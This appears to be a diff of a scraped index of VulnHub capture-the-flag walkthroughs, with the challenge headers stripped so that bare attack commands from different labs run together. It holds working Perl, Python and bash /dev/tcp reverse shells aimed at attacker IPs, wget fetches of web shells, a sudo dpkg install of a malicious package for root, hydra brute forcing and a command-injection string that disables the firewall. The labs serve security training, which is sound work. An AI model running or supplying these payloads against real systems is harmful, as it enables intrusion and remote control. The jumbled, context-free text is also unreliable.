-
-
-
-Challenge Name: zion-1-2-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/zion-1-2-vulnhub-ctf-walkthrough-part-1/
-
 nmap -p- -sV 192.168.1.4
 dirb http://192.168.1.4
 cewl http://192.168.1.4/
 cat >> key
-
-
-
-Challenge Name: sunset-decoy-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/sunset-decoy-vulnhub-ctf-walkthrough/
-
-
-
-
-Challenge Name: victim-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/victim-1-vulnhub-ctf-walkthrough/
-
-
-
-
-
-Challenge Name: mumbai-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/mumbai-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -p- -sV 192.168.1.2
 docker run -it -v /root:mnt/ignite ubuntu
-
-
-
-Challenge Name: my-tomcat-host-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/my-tomcat-host-ctf-walkthrough/
-
 netdiscover
 id
-
-
-
-Challenge Name: bossplayersctf-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/bossplayersctf-1-vulnhub-ctf-walkthrough/
-
-
-
-
-Challenge Name: capture-the-flag-a-walkthrough-of-suncsrs-sumo
-Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-a-walkthrough-of-suncsrs-sumo/
-
-
-
-
-Challenge Name: hacknos-player-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hacknos-player-1-ctf-walkthrough/
-
 dirb
 sudo -l
-
-
-
-Challenge Name: me-and-my-girlfriend-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/me-and-my-girlfriend-1-ctf-walkthrough/
-
-
-
-
-Challenge Name: dmv-1-vulnhub-capture-the-flag-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/dmv-1-vulnhub-capture-the-flag-ctf-walkthrough/
-
 nc -lvp 1234
 ls -a
 cat >> pass.txt
 john pass.txt
 cat clean.sh
 nc -lvp 4444
-
-
-
-Challenge Name: djinn-1-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/djinn-1-ctf-walkthrough-part-1/
-
-
-
-
-Challenge Name: aqua-1-vulnhub-capture-the-flag-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/aqua-1-vulnhub-capture-the-flag-ctf-walkthrough/
-
-
-
-
-Challenge Name: its-october-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/its-october-1-vulnhub-ctf-walkthrough/
-
-
-
-
-Challenge Name: dc-8-capture-the-flag-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/dc-8-capture-the-flag-ctf-walkthrough/
-
-
-
-
-Challenge Name: capture-the-flag-a-walkthrough-of-evm-1
-Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-a-walkthrough-of-evm-1/
-
-
-
-
-Challenge Name: capture-the-flag-ctf-walkthrough-my-file-server-1
-Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-ctf-walkthrough-my-file-server-1/
-
-
-
-
-Challenge Name: ck-00-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/ck-00-ctf-walkthrough-part-2/
-
-
-
-
-Challenge Name: matrix-3-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/matrix-3-ctf-walkthrough/
-
-
-
-
-Challenge Name: ck-00-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/ck-00-ctf-walkthrough-part-1/
-
 gcc
-
-
-
-Challenge Name: vulnhub-ctf-walkthrough-sar-1
-Challenge URL: https://resources.infosecinstitute.com/topic/vulnhub-ctf-walkthrough-sar-1/
-
 netdiscover
 nmap 192.168.1.16 -A
 nc -lvp 1234
@@ -1436,12 +811,6 @@ cat finally.sh
 cat write.sh
 ls -l
 cat /root/root.txt
-
-
-
-Challenge Name: symfonos-5-2-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/symfonos-5-2-ctf-walkthrough/
-
 nmap 192.168.1.20 -A
 ifconfig
 tail
@@ -1460,12 +829,6 @@ chmod +x exploit_1.0_amd64.deb
 sudo -u root /usr/bin/dpkg -i exploit_1.0_amd64.deb
 cat /root/
 cat proof.txt
-
-
-
-Challenge Name: ctf-walkthrough-vulnhub-five86
-Challenge URL: https://resources.infosecinstitute.com/topic/ctf-walkthrough-vulnhub-five86/
-
 wpscan –url http://192.168.1.11/ –enumerate u
 cat
 cat username.txt
@@ -1474,30 +837,12 @@ timeout 140 tcpdump -w hehe.pcab -i veth0878a6c
 tcpdump -r hehe.pcab
 su paul
 sudo -l
-
-
-
-Challenge Name: matrix-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/matrix-1-ctf-walkthrough/
-
 netdiscover
 nmap -p- -Pn 192.168.1.112
-
-
-
-Challenge Name: ch4inrulz-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/ch4inrulz-ctf-walkthrough-part-1/
-
 netdiscover
 nmap 192.168.1.113 -A
 ftp 192.168.1.113
 set RHOSTS 192.168.1.113
-
-
-
-Challenge Name: fowsniff-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/fowsniff-ctf-walkthrough/
-
 netdiscover
 nmap -Pn -p- 192.168.1.103
 hydra pop3://192.168.1.103 -L user.txt -P password.txt
@@ -1510,12 +855,6 @@ gcc 44298.c -o exploit
 cd /tmp/
 wget 192.168.1.107/exploit
 chmod +x exploit
-
-
-
-Challenge Name: typhoon-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/typhoon-ctf-walkthrough/
-
 netdiscover
 msfconsole
 set rhosts 192.168.1.103
@@ -1524,12 +863,6 @@ id
 python –c ‘import pty; pty.spawn(“/bin/sh”)’
 uname –a
 cat /etc/issue
-
-
-
-Challenge Name: billu-b0x-2-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/billu-b0x-2-ctf-walkthrough/
-
 nmap 192.168.1.27 –Pn –p-
 msfconsole
 set rhost 192.168.1.27
@@ -1541,12 +874,6 @@ ls –l /etc/passwd
 openssl passwd -1 –salt infosec
 su indishell
 sudo –i
-
-
-
-Challenge Name: lampiao-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/lampiao-1-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.24 -p- -sV
 dirb http://192.168.1.24:1898/
@@ -1559,32 +886,8 @@ id
 python -c ‘import pty;pty.spawn(“/bin/bash”)’
 uname -a
 cat /etc/issue
-
-
-
-Challenge Name: node-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/node-1-ctf-walkthrough/
-
 cat myplace.backup | base64 -d > myplace
 file myplace
-
-
-
-Challenge Name: golden-eye-1-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/golden-eye-1-ctf-walkthrough-part-2/
-
-
-
-
-Challenge Name: goldeneye-1-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/goldeneye-1-ctf-walkthrough-part-1/
-
-
-
-
-Challenge Name: wakanda1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/wakanda1-ctf-walkthrough/
-
 uname -a
 cat /etc/issue
 import socket,subprocess,os;
@@ -1597,169 +900,16 @@ ls
 cat flag2.txt
 wget 192.168.1.45/bbbb/setup.py
 sudo /usr/bin/pip install . –upgrade –force-reinstall
-
-
-
-Challenge Name: temple-of-doom-1-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/temple-of-doom-1-ctf-walkthrough-part-2/
-
-
-
-
-Challenge Name: bulldog-2-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/bulldog-2-ctf-walkthrough/
-
-
-
-
-Challenge Name: temple-of-doom-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/temple-of-doom-ctf-walkthrough-part-1/
-
-
-
-
-Challenge Name: basic-pentesting-2-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/basic-pentesting-2-ctf-walkthrough/
-
-
-
-
-Challenge Name: toppo-1-capture-the-flag-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/toppo-1-capture-the-flag-walkthrough/
-
-
-
-
-Challenge Name: jis-ctf-vulnupload-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/jis-ctf-vulnupload-walkthrough/
-
-
 perl -e ‘use Socket;$i=”192.168.1.45″;$p=2323;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
-
-
-
-Challenge Name: usv-2017-part-2-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/usv-2017-part-2-ctf-walkthrough/
-
-
-
-
-Challenge Name: usv-2017-part-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/usv-2017-part-1-ctf-walkthrough/
-
 if (_0xb252x4 == 1079950212331060) {
-
-
-
-Challenge Name: 6-days-lab-1-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/6-days-lab-1-1-ctf-walkthrough/
-
-
-
-
-Challenge Name: bulldog-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/bulldog-1-ctf-walkthrough/
-
 python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.11”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’&
-
-
-
-Challenge Name: zico-2-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/zico-2-1-ctf-walkthrough/
-
-
-
-
-Challenge Name: depth-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/depth-1-ctf-walkthrough/
-
 sh -c $@|sh . echo ssh bill@localhost sudo -l
 sh -c $@|sh . echo ssh bill@localhost sudo ufw disable
 sh -c $@|sh . echo ssh bill@localhost sudo wget “http://10.0.2.15:8000/shell.jsp” -O /var/lib/tomcat8/webapps/ROOT/shell.jsp
 ssh bill@localhost sudo bash -i>& /dev/tcp/10.0.2.15/4444 0>&1
-
-
-
-Challenge Name: proteus-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/proteus-1-ctf-walkthrough/
-
 strings
 objdump
 wget http://172.16.92.141/shell.txt -O /tmp/shell.php
 php /tmp/shell.php;
-
-
-
-Challenge Name: acid-server-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/acid-server-ctf-walkthrough/
-
-
-
-
-Challenge Name: secos-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/secos-1-ctf-walkthrough/
-
-
-
-
-Challenge Name: devrandom-pipe-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/devrandom-pipe-ctf-walkthrough/
-
-
-
-
-Challenge Name: ew-skuzzy-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/ew-skuzzy-ctf-walkthrough/
-
-
-
-
-Challenge Name: pluck-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/pluck-1-ctf-walkthrough/
-
-
-
-
-Challenge Name: devrandomsleepy-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/devrandomsleepy-ctf-walkthrough/
-
-
-
-
-Challenge Name: super-mario-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/super-mario-ctf-walkthrough/
-
-
-
-
-Challenge Name: billubox-ctf-walkthrough-2
-Challenge URL: https://resources.infosecinstitute.com/topic/billubox-ctf-walkthrough-2/
-
 python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.120”,4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
-
-
-
-Challenge Name: donkeydocker1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/donkeydocker1-ctf-walkthrough/
-
 ls -a
-
-
-
-
-Challenge Name: hackerfest-sedna-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hackerfest-sedna-ctf-walkthrough/
-
-
-
-
-Challenge Name: minotaur-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/minotaur-ctf-walkthrough/
-
-
-
-
-Challenge Name: hackerfest-quaoar-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hackerfest-quaoar-ctf-walkthrough/
-
-
